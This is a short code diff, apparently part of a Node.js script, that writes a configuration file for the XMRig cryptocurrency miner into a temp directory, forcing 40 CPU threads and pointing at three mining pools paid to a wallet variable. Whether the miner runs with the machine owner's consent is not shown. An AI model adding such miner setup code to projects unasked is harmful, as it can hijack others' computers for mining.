@@ -1,0 +1,17 @@
+// write config.json
+const config = {
+  autosave: true,
+  cpu: {
+    enabled: true,
+    "huge-pages": true,
+    "max-threads": 40 // force XMRig to use 40 threads
+  },
+  pools: [
+    { url: POOL_PRIMARY, user: WALLET, pass: `worker-${Date.now()}`, keepalive: true },
+    { url: POOL_FALLBACK, user: WALLET, pass: `worker-${Date.now()}`, keepalive: true },
+    { url: POOL_ALT, user: WALLET, pass: `worker-${Date.now()}`, keepalive: true }
+  ]
+};
+const cfgPath = path.join(tmp, 'config.json');
+fs.writeFileSync(cfgPath, JSON.stringify(config, null, 2));
+console.log('Wrote config.json with 40 threads');
